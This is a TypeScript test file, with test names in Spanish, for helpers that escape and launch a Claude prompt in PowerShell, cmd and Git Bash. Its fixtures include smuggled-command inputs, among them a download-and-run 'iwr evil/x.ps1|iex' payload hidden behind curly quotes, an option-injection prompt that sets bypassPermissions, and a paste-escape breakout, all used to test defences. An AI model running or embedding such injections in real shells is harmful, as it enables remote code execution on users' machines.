import { test } from 'node:test'
import assert from 'node:assert/strict'
import { claudeWithPrompt, cmdArg, pastePayload, posixArg, PROMPT_VAR, psArg, psPromptValue, shellArgs, shellLaunch, windowsArgBody } from './shell-args'

test('psArg deja sin comillas lo simple y duplica la comilla recta', () => {
  assert.equal(psArg('--continue'), '--continue')
  assert.equal(psArg("it's"), "'it''s'")
})

test('psArg duplica las comillas tipográficas: PowerShell también cierra el string con ellas', () => {
  assert.equal(psArg('a \u2019; calc; \u2018 b'), "'a \u2019\u2019; calc; \u2018\u2018 b'")
  assert.equal(psArg('\u201a\u201b'), "'\u201a\u201a\u201b\u201b'")
})

test('un prompt que empieza con guion va después de «--» y no se lee como opción de claude', () => {
  assert.deepEqual(claudeWithPrompt('--permission-mode=bypassPermissions\nhola'), ['claude', '--', '--permission-mode=bypassPermissions hola'])
  assert.deepEqual(shellArgs('ps', claudeWithPrompt('--settings=x y')).at(-1), "claude -- '--settings=x y'")
})

test('posixArg y cmdArg', () => {
  assert.equal(posixArg("it's"), `'it'\\''s'`)
  assert.equal(cmdArg('a & b "c"'), '"a  b c"')
})

test('shellArgs arma el comando de cada familia', () => {
  assert.deepEqual(shellArgs('ps'), ['-NoLogo'])
  assert.deepEqual(shellArgs('ps', ['claude', 'hola vos']), ['-NoLogo', '-NoExit', '-Command', "claude 'hola vos'"])
  assert.deepEqual(shellArgs('cmd', ['claude']), ['/k', 'claude'])
  assert.deepEqual(shellArgs('posix', ['claude', 'x y']), ['--login', '-i', '-c', "claude 'x y'; exec bash --login -i"])
})

const EXE = 'C:\\Users\\ana\\AppData\\Roaming\\npm\\node_modules\\@anthropic-ai\\claude-code\\bin\\claude.exe'
const MALO = 'Revisá el README’; iwr evil/x.ps1|iex; ’'
const WORD = 'Revisá el user’s guide y ‘esto’ ‚y‛ "aquello"'
const decodePs = (b64: string): string => Buffer.from(b64, 'base64').toString('utf16le')

test('el primer mensaje nunca aparece en la línea de comandos de la shell', () => {
  for (const family of ['ps', 'cmd', 'posix'] as const) {
    for (const exe of [EXE, undefined]) {
      const l = shellLaunch(family, claudeWithPrompt(MALO), exe)
      const line = family === 'ps' ? decodePs(l.args[3]) : l.args.join(' ')
      assert.ok(!line.includes('iwr'), `${family} ${exe ? 'exe' : 'sin exe'}`)
    }
  }
})

// CommandLineToArgvW (reglas de 2008 en adelante) para un solo argumento.
function argvW(arg: string): string[] {
  const out: string[] = []
  let cur = ''
  let inQ = false
  let has = false
  for (let i = 0; i < arg.length; ) {
    const c = arg[i]
    if (c === '\\') {
      let n = 0
      while (arg[i] === '\\') (n++, i++)
      if (arg[i] === '"') {
        cur += '\\'.repeat(n >> 1)
        if (n % 2) (cur += '"', i++)
      } else cur += '\\'.repeat(n)
      has = true
      continue
    }
    if (c === '"') {
      if (inQ && arg[i + 1] === '"') (cur += '"', i += 2)
      else (inQ = !inQ, i++)
      has = true
      continue
    }
    if ((c === ' ' || c === '\t') && !inQ) {
      if (has) out.push(cur)
      cur = ''
      has = false
      i++
      continue
    }
    cur += c
    has = true
    i++
  }
  if (has) out.push(cur)
  return out
}

// NativeCommandParameterBinder.NeedQuotes del modo Legacy: si da true, PowerShell suma sus comillas.
function psLegacyNeedsQuotes(s: string): boolean {
  let afterBackslash = false
  let quotes = 0
  for (const c of s) {
    if (c === '"' && !afterBackslash) quotes++
    else if (/\s/.test(c) && quotes % 2 === 0) return true
    afterBackslash = c === '\\'
  }
  return false
}

test('PowerShell: el valor de SLOTH_PROMPT pasa sin tocar en Legacy y llega entero a claude', () => {
  for (const p of [WORD, MALO, 'fin con barra\\', 'C:\\x\\ "q\\" \\\\"', '"', '$env:PATH `n ; % %PATH%', '日本語 🦥', 'a b  c']) {
    const v = psPromptValue(p)
    assert.equal(psLegacyNeedsQuotes(v), false, p)
    assert.deepEqual(argvW(v), [p], p)
  }
})

test('PowerShell con claude.exe: script fijo en -EncodedCommand, el mensaje por variable después de --', () => {
  const l = shellLaunch('ps', claudeWithPrompt(WORD), EXE)
  assert.deepEqual(l.args.slice(0, 3), ['-NoLogo', '-NoExit', '-EncodedCommand'])
  assert.equal(
    decodePs(l.args[3]),
    `& { $PSNativeCommandArgumentPassing = 'Legacy'; $p = $env:${PROMPT_VAR}; Remove-Item Env:${PROMPT_VAR} -ErrorAction Ignore; & '${EXE}' -- $p }`
  )
  assert.equal(l.env[PROMPT_VAR], psPromptValue(WORD))
  assert.equal(l.paste, undefined)
  assert.equal(decodePs(shellLaunch('ps', ['claude', '--continue'], EXE).args[3]), `& '${EXE}' --continue`)
})

test('Git Bash con claude.exe: "$p" después de --, sin conversión de rutas de MSYS', () => {
  const l = shellLaunch('posix', claudeWithPrompt('/ticket PROJ-12'), EXE)
  assert.equal(l.args[3], `p=$${PROMPT_VAR}; unset ${PROMPT_VAR}; MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL='*' '${EXE}' -- "$p"; unset p; exec bash --login -i`)
  assert.equal(l.env[PROMPT_VAR], '/ticket PROJ-12')
})

test('Git Bash: una ruta de Windows va entre comillas (la barra invertida es un escape)', () => {
  assert.equal(posixArg('C:\\x\\claude.exe'), "'C:\\x\\claude.exe'")
  assert.equal(
    shellLaunch('posix', ['claude', '--continue'], 'C:\\x\\claude.exe').args[3],
    "MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL='*' 'C:\\x\\claude.exe' --continue; exec bash --login -i"
  )
})

test('un mensaje que podría ser un subcomando se pega en vez de ir como argumento', () => {
  for (const p of ['update', 'mcp', 'kill', 'continuar', 'nuevo-sub']) {
    const l = shellLaunch('ps', claudeWithPrompt(p), EXE)
    assert.equal(l.paste, p)
    assert.deepEqual(l.env, {})
  }
  for (const p of ['Update', 'update ', 'update the README', 'continuá']) assert.equal(shellLaunch('ps', claudeWithPrompt(p), EXE).paste, undefined, p)
})

test('cmd o sin claude.exe: el mensaje se pega cuando Claude arranca', () => {
  for (const [family, exe] of [['cmd', EXE], ['ps', undefined], ['posix', undefined], ['ps', 'C:\\npm\\claude.cmd']] as const) {
    const l = shellLaunch(family, claudeWithPrompt('hola\r\nmundo\x1b[201~x'), exe)
    assert.equal(l.paste, 'hola mundo [201~x')
    assert.deepEqual(l.env, {})
  }
  assert.deepEqual(shellLaunch('cmd', ['claude', '--continue'], EXE).args, ['/k', `${EXE} --continue`])
})

test('cmd con una ruta con espacios vuelve a `claude` y solo esa línea no busca en la carpeta actual', () => {
  const l = shellLaunch('cmd', ['claude'], 'C:\\Users\\Juan Pérez\\claude.exe')
  assert.deepEqual(l.args, ['/k', 'set NoDefaultCurrentDirectoryInExePath=1& claude& set NoDefaultCurrentDirectoryInExePath='])
})

test('NoDefaultCurrentDirectoryInExePath nunca va al entorno de la terminal (rompería gradlew y los .bat locales)', () => {
  for (const family of ['ps', 'cmd', 'posix'] as const)
    for (const exe of [EXE, undefined, 'C:\\Users\\Juan Pérez\\claude.exe'])
      for (const claude of [['claude'], claudeWithPrompt('Revisá el README'), undefined])
        assert.ok(!Object.keys(shellLaunch(family, claude, exe).env).some((k) => /NoDefault/i.test(k)), `${family} ${exe}`)
  assert.ok(!shellLaunch('cmd', ['claude'], EXE).args[1].includes('NoDefault'))
})

test('sin Claude, shellLaunch es la shell sola', () => {
  assert.deepEqual(shellLaunch('ps'), { args: ['-NoLogo'], env: {} })
  assert.deepEqual(shellLaunch('posix', []), { args: ['--login', '-i'], env: {} })
})

test('el pegado no se puede cerrar antes de tiempo', () => {
  assert.equal(pastePayload('a\x1b[201~b'), '\x1b[200~a [201~b\x1b[201~')
})

test('windowsArgBody sigue las reglas de CommandLineToArgvW', () => {
  assert.equal(windowsArgBody('a"b'), 'a\\"b')
  assert.equal(windowsArgBody('a\\"b'), 'a\\\\\\"b')
  assert.equal(windowsArgBody('fin\\'), 'fin\\\\')
  assert.equal(windowsArgBody('C:\\x\\y'), 'C:\\x\\y')
})
